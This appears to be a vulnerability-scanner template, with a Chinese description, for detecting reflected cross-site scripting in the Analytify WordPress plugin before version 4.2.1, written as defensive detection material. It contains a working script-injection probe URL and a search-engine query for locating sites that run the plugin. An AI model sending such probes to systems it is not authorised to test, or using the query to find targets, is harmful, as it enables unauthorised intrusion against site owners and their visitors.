id: analytify-plugin-xss

info:
  name: Analytify <4.2.1 - 跨站脚本漏洞
  author: Akincibor
  severity: medium
  description: |
    该模板用于检测 Analytify <4.2.1 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/aa404bb?a</script><script>alert(/XSS/)</script>` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://wpscan.com/vulnerability/b8415ed5-6fd0-42fe-9201-73686c1871c5
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
    cpe: cpe:2.3:a:analytify:analytify_-_google_analytics_dashboard:*:*:*:*:wordpress:*:*:*
  metadata:
    verified: true
    max-request: 1
    google-query: inurl:/wp-content/plugins/wp-analytify
    product: analytify_-_google_analytics_dashboard
    vendor: analytify
  tags: wordpress,analytify,wpscan,wp-plugin,xss,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/aa404bb?a</script><script>alert(/XSS/)</script>'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'text/javascript">alert(/XSS/)</script>'
          - 'wp-analytify'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 404
